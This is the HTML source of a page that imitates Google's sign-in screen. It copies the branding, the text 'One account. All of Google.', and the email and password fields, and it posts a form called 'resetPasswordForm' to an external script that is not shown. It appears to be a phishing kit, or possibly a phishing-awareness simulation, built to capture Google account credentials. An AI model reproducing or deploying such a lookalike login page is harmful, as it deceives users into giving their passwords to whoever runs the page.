<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
	
    <title>Google - Sign In</title>
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400" rel="stylesheet">
    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.css" rel="stylesheet">
	<link rel="icon" href="favicon.ico"/>
    <!-- Custom CSS -->
    <link href="css/heroic-features.css" rel="stylesheet">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body style="padding-top:0px;min-width:354px;">

    <!-- Page Content -->
	<div class="section">
	<div class="row" style="padding-left:44px;padding-right:44px;height:83px; margin:0px">
	<img src="google.png" class="center-block" style="margin-top:25px;margin-bottom:20px;"></img>
	</div>
	
	<div class="row">
	<h1 style="margin-bottom:15px;margin-top:0px;font-size:38px;font-family: 'Open Sans',sans-serif; font-weight:300;color: #555;text-align:center;">One account. All of Google.</h1>
	<h4 style="margin-bottom:15px;margin-top:0px;font-family: 'Open Sans',sans-serif;-webkit-font-smoothing: antialiased;font-weight:400;color: #555;text-align:center;">Sign in with your Google Account</h4>
	</div>
	
	</div>
	
	<div class="container" style="height:550px;">
    <div class="container" style="width:354px;background-color:#f7f7f7;border: 1px solid rgba(0,0,0,0.15); border-radius:10px 10px 10px 10px;padding:40px;margin-left:auto;margin-right:auto;-moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);-webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);">
        <!-- Jumbotron Header -->
		<div class="col-xs-12">
		<div class="row">
        <div class="col-xs-12" style="display:inline-block;text-align:center;">
			<img src="man.png" style="height:96px;width:auto;margin-bottom:26px;">
		</div>
		</div>
		<div class="row">
		<div class="col-xs-12" style="padding:0px;">
		<div class="input-group" style="width:274px;margin:0 auto;">
		<input type="text" class="form-control" placeholder="Enter your email" aria-describedby="basic-addon1" style="margin-bottom:6.5px;font-family: 'Arial',sans-serif;font-size:16px;padding-left:8px;padding-right:8px;height:44px;border-radius:0px;">
		</div>
		<div class="input-group" style="margin:0 auto;display:block;width:274px;margin:0 auto;">
		<input type="password" class="form-control" placeholder="Password" aria-describedby="basic-addon1" style="margin-bottom:6.5px;font-family: 'Arial',sans-serif;font-size:16px;padding-left:8px;padding-right:8px;height:44px;border-radius:0px;">
		</div>
		</div>
		</div>
		</div>
		
			
		<form id="resetPasswordForm" method="post" style="width:274px;margin:0 auto;display:block;">
           <button type="submit" value="ResetPassword" name="submitBtn" class="btn btn-primary btn-large" style="margin-bottom:10px;line-height: 36px;padding:0px;width:100%;min-width:46px;height:36px;font-weight:700;font-family: 'Arial', sans-serif;font-size:13px; border: 1px solid #3079ed;background-color: #4d90fe;border-radius:3px;">Next</button>
		</form>
		<a href="https://accounts.google.com/signin/usernamerecovery?hl=en" style="text-align:right;float:right;">
		  Find my account
		  </a>
	</div>
	<div class="container" style="width:354px;">
	<div class="section" style="margin-top:27px;">
	
	<div class="row" style="padding-left:44px;padding-right:44px;text-align:center;padding-bottom:30px;">
	<a href="https://accounts.google.com/SignUp?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount">
	  Create account
	  </a>
	</div>
	</div>
	
	
	
	<div class="row" style="padding-left:44px;padding-right:44px;text-align:center;font-family:Arial, sans-serif;">
	<p>
	  One Google Account for everything Google
	</p>
	</div>
	<div class="row">
	<img src="logos.png" class="center-block"></img>
	</div>
	</div>
	</div>
	
    <!-- /.container -->

    <!-- jQuery -->
    <script src="js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>
		<script src="js/resetPassword.js" type="text/javascript"></script>
</body>

</html>
